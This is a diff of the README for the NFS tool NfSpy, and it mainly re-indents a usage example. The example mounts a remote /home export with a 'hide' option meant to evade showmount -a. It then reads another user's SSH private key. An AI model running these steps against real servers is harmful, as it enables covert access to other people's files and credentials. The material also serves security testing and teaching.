@@ -58,38 +58,38 @@ Using NfSpy
 
 A list of options can be seen by running
 
- nfspy --help
+    nfspy --help
 
 ### Example
 
 There is an NFS server on 192.168.1.124.
 
- $ showmount -e 192.168.1.124
- Export list for 192.168.1.124:
- /home (everyone)
+    $ showmount -e 192.168.1.124
+    Export list for 192.168.1.124:
+    /home (everyone)
 
 Mount up the share. Using sudo lets you bind to a privileged port, and the 
 allow_other option lets any user use the filesystem. The other new option here
 is "hide", which immediately "unmounts" the share on the server, but keeps the 
 filehandle it got. This hides your presence from anyone using showmount -a
 
- $ sudo nfspy -o server=192.168.1.124:/home,hide,allow_other,ro,intr /mnt
+    $ sudo nfspy -o server=192.168.1.124:/home,hide,allow_other,ro,intr /mnt
 
 Enjoy your newfound freedom!
 
- $ cd /mnt
- /mnt$ ls -l
- drwx------ 74 8888 200 4096 2011-03-03 09:55 smithj
- /mnt$ cd smithj
- /mnt/smithj$ cat .ssh/id.rsa
- -----BEGIN RSA PRIVATE KEY-----
- Proc-Type: 4,ENCRYPTED
- DEK-Info: DES-EDE3-CBC,30ADB54EE502CA1A
- <snip>
+    $ cd /mnt
+    /mnt$ ls -l
+    drwx------ 74 8888 200 4096 2011-03-03 09:55 smithj
+    /mnt$ cd smithj
+    /mnt/smithj$ cat .ssh/id.rsa
+    -----BEGIN RSA PRIVATE KEY-----
+    Proc-Type: 4,ENCRYPTED
+    DEK-Info: DES-EDE3-CBC,30AEB543E512CA19
+    <snip>
 
 To unmount, use fusermount:
 
- $ sudo fusermount -u /mnt
+    $ sudo fusermount -u /mnt
 
 BUGS
 ----
